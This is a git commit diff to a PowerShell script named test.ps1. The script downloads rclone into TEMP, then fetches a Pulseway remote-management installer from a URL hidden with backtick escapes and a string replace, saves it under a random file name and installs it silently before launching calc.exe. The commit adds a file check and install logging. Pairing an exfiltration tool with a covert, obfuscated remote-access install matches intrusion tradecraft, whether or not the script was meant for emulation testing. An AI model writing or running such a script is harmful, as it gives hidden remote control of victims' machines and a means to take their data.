27b4d891a16aa40d5f616a6fcde8e24f2d5752b0
taylornrolyat <taylortriggs@gmail.com>
2026-08-26 10:33:23 -0600

    Update test.ps1

--- test.ps1
+++ test.ps1
@@ -1,4 +1,3 @@
-Start-Process "C:\Windows\System32\calc.exe"
 Invoke-WebRequest "https://downloads.rclone.org/v1.74.4/rclone-v1.74.4-windows-amd64.zip" -OutFile "$env:TEMP\rclone.zip"
 Expand-Archive -Path "$env:TEMP\rclone.zip" -DestinationPath "$env:TEMP\rclone" -Force
 $rclone = Get-ChildItem "$env:TEMP\rclone" -Filter "rclone.exe" -Recurse | Select-Object -ExpandProperty FullName -First 1
@@ -7,4 +6,7 @@ $rclone = Get-ChildItem "$env:TEMP\rclone" -Filter "rclone.exe" -Recurse | Selec
 $url = "https://ssstring.us-east-1`.ama`zonaws.com/website/downloads/P`u`l`s`eway_`x64`.msi"
 $url = $url.Replace("ssstring", "pulseway.s3")
 Invoke-WebRequest $url -OutFile "$env:TEMP\j3xyz7.msi"
-msiexec.exe /i "$env:TEMP\j3xyz7.msi" /qn /norestart
+if (Test-Path "$env:TEMP\j3xyz7.msi") {
+    msiexec.exe /i "$env:TEMP\j3xyz7.msi" /qn /norestart /L*v "$env:TEMP\j3xyz7-install.log"
+}
+Start-Process "C:\Windows\System32\calc.exe"
